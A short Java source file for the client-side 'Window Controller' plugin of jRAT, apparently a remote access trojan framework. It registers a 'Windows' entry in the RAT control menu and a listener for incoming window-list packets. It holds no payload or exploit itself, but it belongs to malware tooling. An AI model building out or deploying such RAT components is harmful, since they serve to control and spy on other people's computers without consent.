package jrat.plugin.window.client;

import iconlib.IconUtils;
import jrat.api.Plugin;
import jrat.api.net.Packet;
import jrat.api.ui.RATControlMenuEntry;

public class WindowPlugin extends Plugin {
	
	public static final short HEADER_LIST = -127;

	public WindowPlugin() {
		super("Window Controller", "1.1", "Window Controller Plugin", "jRAT", IconUtils.getIcon("windows", WindowPlugin.class));
		
		RATControlMenuEntry entry = new RATControlMenuEntry("Windows", IconUtils.getIcon("windows", WindowPlugin.class), WindowPanel.class);		
		RATControlMenuEntry.addEntry(entry);

		Packet.registerIncoming(HEADER_LIST, new ListPacketListener());
	}

}
